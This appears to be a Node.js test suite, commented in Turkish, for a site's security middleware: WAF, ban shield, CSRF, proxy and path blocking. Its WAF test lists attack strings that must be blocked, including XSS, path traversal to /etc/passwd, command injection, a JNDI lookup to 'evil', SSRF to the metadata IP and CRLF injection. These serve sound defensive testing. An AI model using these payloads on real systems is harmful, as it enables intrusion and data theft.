// node --import ./scripts/tests/_register.mjs --test scripts/tests/shield.test.mjs
import './_register.mjs';
import test from 'node:test';
import assert from 'node:assert/strict';

const { ipBucket } = await import('@/lib/security/ipUtil');
const { counters, bans } = await import('@/lib/security/memStore');
const shield = await import('@/lib/threatShield');
const waf = await import('@/lib/security/waf');
const { checkProxy, constantTimeEqual } = await import('@/lib/security/proxyGuard');
const { checkBodySize } = await import('@/lib/security/bodyLimit');
const { csrfViolation } = await import('@/lib/security/csrfGuard');
const { isBlockedPath } = await import('@/lib/security/pathBlock');

const H = (o = {}) => new Headers(o);
const ALLOWED = waf.getAllowedHosts({ NEXT_PUBLIC_BASE_URL: 'https://asteria.example', NODE_ENV: 'production' });
const inspect = (over = {}) =>
    waf.inspectRequest(
        { method: 'GET', pathname: '/', search: '', headers: H({ host: 'asteria.example' }), ...over },
        { allowedHosts: ALLOWED },
    );

// ── ipBucket ────────────────────────────────────────────────────────────
test('ipBucket: IPv4 aynen, IPv6 /64, mapped → IPv4', () => {
    assert.equal(ipBucket('203.0.113.9'), '203.0.113.9');
    assert.equal(ipBucket('2001:db8:1:2:aaaa:bbbb:cccc:dddd'), '2001:db8:1:2::/64');
    assert.equal(ipBucket('2001:db8:1:2::1'), '2001:db8:1:2::/64');
    assert.equal(ipBucket('2001:db8:1:2:ffff::9'), '2001:db8:1:2::/64'); // aynı /64
    assert.equal(ipBucket('::ffff:203.0.113.9'), '203.0.113.9');
    assert.equal(ipBucket('::ffff:cb00:7109'), '203.0.113.9');
});

// ── memStore ────────────────────────────────────────────────────────────
test('memStore: TTL ve NX davranışı', () => {
    counters.clear();
    const t0 = 1_000_000;
    assert.equal(counters.incr('k', 1000, 1, t0).count, 1);
    assert.equal(counters.incr('k', 1000, 1, t0 + 500).count, 2);
    assert.equal(counters.incr('k', 1000, 1, t0 + 1500).count, 1); // süre doldu → sıfırdan
});

// ── Threat shield (bellek modu) ─────────────────────────────────────────
test('shield: ağırlıklı ihlal tek seferde banlar, kademeli süre artar, IPv6 /64 paylaşır', async () => {
    counters.clear(); bans.clear();
    const ip = '198.51.100.20';
    assert.equal((await shield.checkRequest(ip)).banned, false);
    await shield.recordViolation(ip, 'waf:xss', 3);
    assert.equal((await shield.checkRequest(ip)).banned, true);

    // 3 hafif ihlal = ban
    const ip2 = '198.51.100.21';
    await shield.recordViolation(ip2, 'x', 1);
    await shield.recordViolation(ip2, 'x', 1);
    assert.equal((await shield.checkRequest(ip2)).banned, false);
    await shield.recordViolation(ip2, 'x', 1);
    assert.equal((await shield.checkRequest(ip2)).banned, true);

    // IPv6: aynı /64'ten başka adres de banlı
    await shield.recordViolation('2001:db8:aa:bb::1', 'waf:rce', 3);
    assert.equal((await shield.checkRequest('2001:db8:aa:bb:1234:5678:9abc:def0')).banned, true);
    assert.equal((await shield.checkRequest('2001:db8:aa:cc::1')).banned, false);
});

test('shield: 0.0.0.0 asla banlanmaz', async () => {
    await shield.recordViolation('0.0.0.0', 'x', 10);
    assert.equal((await shield.checkRequest('0.0.0.0')).banned, false);
});

// ── WAF ─────────────────────────────────────────────────────────────────
test('WAF: temiz istekler geçer (yanlış pozitif yok)', () => {
    for (const [pathname, search] of [
        ['/', ''], ['/seri/solo-leveling', ''], ['/seri/solo-leveling/bolum/12', ''],
        ['/api/series', '?q=Solo+Leveling&page=2&sort=latest'],
        ['/api/series', '?q=select+all+the+things'], ['/api/series', '?q=Tom+%26+Jerry'],
        ['/blog/my-first-post', ''], ['/api/series', '?genre=aksiyon&genre=dram'],
        ['/seri/%C5%9Fehir-masallar%C4%B1', ''], ['/api/series', '?q=%C3%A7ay'],
    ]) {
        assert.equal(inspect({ pathname, search }), null, `${pathname}${search}`);
    }
});

test('WAF: saldırı kalıpları engellenir', () => {
    const bad = [
        ['/api/series', '?q=<script>alert(1)</script>'],
        ['/api/series', '?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E'],
        ['/api/series', '?q=%253Cscript%253E'],
        ['/api/series', '?q="><img src=x onerror=alert(1)>'],
        ['/api/series', '?q=javascript:alert(1)'],
        ['/api/series', '?f=../../../../etc/passwd'],
        ['/api/series', '?f=..%2f..%2f..%2fetc%2fpasswd'],
        ['/api/%2e%2e%2f%2e%2e%2fadmin', ''],
        ['/api/series', '?f=php://filter/convert.base64-encode/resource=index'],
        ['/api/series', '?x=;cat /etc/hosts'],
        ['/api/series', '?x=${jndi:ldap://evil/a}'],
        ['/api/series', '?x={{7*7}}'],
        ['/api/series', '?u=http://169.254.169.254/latest/meta-data'],
        ['/api/series', '?user[$ne]=1'],
        ['/api/series', '?__proto__[admin]=1'],
        ['/api/series', '?a=%00'],
        ['/api/series', '?a=%0d%0aSet-Cookie:x=1'],
        ['/api/%c0%ae%c0%ae/x', ''],
        ['/api/series', '?a=' + 'x'.repeat(3100)],
        ['/api/series', '?' + Array.from({ length: 70 }, (_, i) => `p${i}=1`).join('&')],
    ];
    for (const [pathname, search] of bad) {
        assert.ok(inspect({ pathname, search }), `geçmemeli: ${pathname}${search.slice(0, 60)}`);
    }
});

test('WAF: metod, smuggling, Host, iç başlık sahteciliği', () => {
    assert.equal(inspect({ method: 'TRACE' }).status, 405);
    assert.equal(inspect({ method: 'CONNECT' }).status, 405);
    assert.equal(inspect({ headers: H({ host: 'asteria.example', 'content-length': '5', 'transfer-encoding': 'chunked' }) }).reason, 'smuggling:cl_te');
    assert.equal(inspect({ headers: H({ host: 'asteria.example', 'content-length': '5, 5' }) }).reason, 'smuggling:bad_cl');
    assert.equal(inspect({ headers: H({ host: 'evil.com' }) }).reason, 'host:not_allowed');
    assert.equal(inspect({ headers: H({ host: 'asteria.example', 'x-forwarded-host': 'evil.com' }) }).reason, 'host:xfh_not_allowed');
    assert.equal(inspect({ headers: H({ host: 'asteria.example@evil.com' }) }).reason, 'host:malformed');
    assert.equal(inspect({ headers: H({ host: 'asteria.example', 'x-middleware-subrequest': 'middleware' }) }).reason, 'header:internal_spoof');
    assert.equal(inspect({ headers: H({ host: 'www.asteria.example' }) }), null); // www varyantı serbest
    assert.equal(inspect({ headers: H({ host: 'asteria.example:443' }) }), null);
});

test('WAF: izin listesi yapılandırılmamışsa Host kontrolü atlanır', () => {
    assert.equal(
        waf.inspectRequest({ method: 'GET', pathname: '/', search: '', headers: H({ host: 'anything.test' }) }, { allowedHosts: null }),
        null,
    );
});

// ── Proxy kilidi ────────────────────────────────────────────────────────
test('proxyGuard: Vercel/standart modda kapalı; SELF_HOSTED=1 fail-closed', () => {
    assert.equal(checkProxy(H(), {}), null);
    assert.equal(checkProxy(H(), { SELF_HOSTED: '1', VERCEL: '1' }), null);
    assert.equal(checkProxy(H(), { SELF_HOSTED: '1' }).status, 503); // secret yok
    assert.equal(checkProxy(H(), { SELF_HOSTED: '1', PROXY_SHARED_SECRET: 'kisa' }).status, 503);
    const secret = 'a'.repeat(40);
    assert.equal(checkProxy(H(), { SELF_HOSTED: '1', PROXY_SHARED_SECRET: secret }).status, 403);
    assert.equal(checkProxy(H({ 'x-asteria-proxy': 'b'.repeat(40) }), { SELF_HOSTED: '1', PROXY_SHARED_SECRET: secret }).status, 403);
    assert.equal(checkProxy(H({ 'x-asteria-proxy': secret }), { SELF_HOSTED: '1', PROXY_SHARED_SECRET: secret }), null);
    assert.equal(constantTimeEqual('abc', 'abcd'), false);
    assert.equal(constantTimeEqual('abc', 'abc'), true);
});

// ── Gövde boyutu / CSRF ─────────────────────────────────────────────────
test('bodyLimit: yola göre tavan', () => {
    const MB = 1024 * 1024;
    assert.equal(checkBodySize('POST', '/api/comments/x', H({ 'content-length': String(2 * MB) }), {}), null);
    assert.equal(checkBodySize('POST', '/api/series/rate', H({ 'content-length': String(2 * MB) }), {}).status, 413);
    assert.equal(checkBodySize('POST', '/api/admin/x', H({ 'content-length': String(60 * MB) }), {}), null);
    assert.equal(checkBodySize('POST', '/api/admin/x', H({ 'content-length': String(70 * MB) }), {}).status, 413);
    assert.equal(checkBodySize('GET', '/api/x', H({ 'content-length': '999999999' }), {}), null);
});

test('csrfGuard: cross-origin POST engellenir, aynı site/sunucudan-sunucuya geçer', () => {
    const post = (headers, path = '/api/comments') => csrfViolation('POST', path, H(headers), ALLOWED);
    assert.equal(post({ origin: 'https://asteria.example' }), null);
    assert.equal(post({ origin: 'https://www.asteria.example' }), null);
    assert.equal(post({ origin: 'https://evil.com' }).status, 403);
    assert.equal(post({ origin: 'null' }).status, 403);
    assert.equal(post({ 'sec-fetch-site': 'cross-site' }).status, 403);
    assert.equal(post({}), null); // curl / cron
    assert.equal(post({ origin: 'https://evil.com' }, '/api/cron/blog-queue'), null);
    assert.equal(csrfViolation('GET', '/api/x', H({ origin: 'https://evil.com' }), ALLOWED), null);
});

test('pathBlock: meşru rotalar engellenmez', () => {
    for (const p of ['/', '/seri/console-xyz', '/blog/remote-work', '/user/vpn-guy', '/api/img', '/admin5', '/admin-panel', '/dogrulama', '/p/hakkimizda']) {
        assert.equal(isBlockedPath(p), false, p);
    }
    for (const p of ['/.env', '/cgi-bin/x', '/console', '/index.php', '/backup.zip']) assert.equal(isBlockedPath(p), true, p);
});
